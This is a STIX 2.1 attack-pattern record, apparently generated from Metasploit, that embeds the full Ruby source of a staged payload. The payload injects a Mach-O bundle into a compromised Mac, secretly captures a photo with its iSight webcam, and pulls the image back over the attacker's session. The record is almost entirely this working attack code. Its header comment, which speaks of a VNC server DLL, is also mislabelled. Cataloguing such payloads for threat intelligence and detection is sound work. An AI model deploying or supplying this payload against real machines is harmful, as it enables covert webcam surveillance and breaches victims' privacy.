{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8a13a344-8147-4056-8e0c-474bc149e16f",
    "created": "2024-08-14T16:33:19.247499Z",
    "modified": "2024-08-14T16:33:19.247503Z",
    "name": "Mac OS X x86 iSight Photo Capture",
    "description": "Inject a Mach-O bundle to capture a photo from the iSight (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/osx/x86/isight.rb",
            "external_id": "isight.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'fileutils'\nrequire 'rex/compat'\n\n###\n#\n# Injects the VNC server DLL and runs it over the established connection.\n#\n###\nmodule MetasploitModule\n\n  include Msf::Payload::Osx::BundleInject\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Mac OS X x86 iSight Photo Capture',\n      'Description'   => 'Inject a Mach-O bundle to capture a photo from the iSight (staged)',\n      'Author'        => 'ddz',\n      'License'       => MSF_LICENSE,\n      'Session'       => Msf::Sessions::CommandShell))\n\n    # Override the BUNDLE path with the iSight capture library\n    register_options(\n      [\n        OptPath.new('BUNDLE',\n          [\n            true,\n            \"The local path to the iSight Mach-O Bundle to upload\",\n            File.join(Msf::Config.data_directory, \"isight.bundle\")\n          ]),\n        OptBool.new('AUTOVIEW',\n          [\n            true,\n            \"Automatically open the picture in a browser \",\n            true\n          ])\n      ])\n  end\n\n  def on_session(session)\n    print_status(\"Downloading photo...\")\n\n    photo_length = session.rstream.read(4).unpack('V')[0]\n\n    print_status(\"Downloading photo (#{photo_length} bytes)...\")\n\n\n    photo = \"\"\n    while(photo.length < photo_length)\n      buff = session.rstream.get_once(-1, 5)\n      break if not buff\n      photo << buff\n    end\n\n    # Extract the host and port\n    host = session.session_host\n\n    # Create a directory for the images\n    base = File.join(Msf::Config.config_directory, 'logs', 'isight')\n    dest = File.join(base,\n      host + \"_\" + Time.now.strftime(\"%Y%m%d.%M%S\")+sprintf(\"%.5d\",rand(100000))+\".jpg\"\n    )\n\n    # Create the log directory\n    FileUtils.mkdir_p(base)\n    File.open(dest, 'wb') do |f|\n      f.write(photo)\n      f.flush\n    end\n\n    print_status(\"Photo saved as #{dest}\")\n\n    if datastore['AUTOVIEW']\n      print_status(\"Opening photo in a web browser...\")\n      Rex::Compat.open_browser(File.expand_path(dest))\n    end\n\n    super(session)\n  end\nend\n"
}